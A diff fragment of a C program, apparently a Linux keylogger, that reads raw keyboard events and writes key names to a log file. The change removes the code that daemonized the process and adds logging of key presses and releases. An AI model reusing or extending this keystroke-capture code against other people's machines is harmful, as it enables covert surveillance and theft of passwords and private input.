@@ -83,13 +83,6 @@ int main(int argc, char **argv) {
    // We want to write to the file on every keypress, so disable buffering
    setbuf(logfile, NULL);
 
-   // Daemonize process. Don't change working directory but redirect standard
-   // inputs and outputs to /dev/null
-   if (daemon(1, 0) == -1) {
-     LOG_ERROR("%s", strerror(errno));
-     exit(-1);
-   }
-
    uint8_t shift_pressed = 0;
    input_event event;
    while (read(kbd_fd, &event, sizeof(input_event)) > 0) {
@@ -101,12 +94,20 @@ int main(int argc, char **argv) {
             char *name = getKeyText(event.code, shift_pressed);
             if (strcmp(name, UNKNOWN_KEY) != 0) {
               //LOG("%s", name);
+              fputs("pressed ", logfile);
               fputs(name, logfile);
               fputs("\n", logfile);
             }
          } else if (event.value == KEY_RELEASE) {
             if (isShift(event.code)) {
                shift_pressed--;
+            }
+            char *name = getKeyText(event.code, shift_pressed);
+            if (strcmp(name, UNKNOWN_KEY) != 0) {
+              //LOG("%s", name);
+              fputs("released ", logfile);
+              fputs(name, logfile);
+              fputs("\n", logfile);
             }
          }
       }
